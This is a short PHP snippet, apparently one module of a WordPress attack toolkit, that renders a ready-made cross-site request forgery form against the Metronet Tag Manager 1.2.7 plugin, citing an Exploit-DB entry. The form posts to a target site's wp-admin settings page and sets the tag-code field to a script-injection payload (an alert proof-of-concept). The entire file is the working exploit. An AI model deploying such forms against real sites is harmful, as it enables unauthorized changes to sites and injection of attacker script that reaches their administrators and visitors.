<?php   echo "<h3>WordPress Plugin Metronet Tag Manager 1.2.7 - Cross-Site Request Forgery <span style=\"color:red;\">(auth needed)</span></h3>";
  echo "<a href=\"https://www.exploit-db.com/exploits/44632/\">https://www.exploit-db.com/exploits/44632/</a><br><br>";
  echo "<form class=\"wp-form\" method=\"POST\" action=\"http://".$url."/wp-admin/options-general.php?page=metronet-tag-manager\"><br>";
  echo " <p>submit  <input type=\"text\" size=\"50\" name=\"submit\" value=\"1\"></p>&nbsp;";
  echo " <p>gtm  <input type=\"text\" size=\"50\" name=\"gtm-code-head\" value=\"<script>alert(1)</script>\"></p>";
  echo "<input type=\"submit\">";
  echo "</form>"; ?>
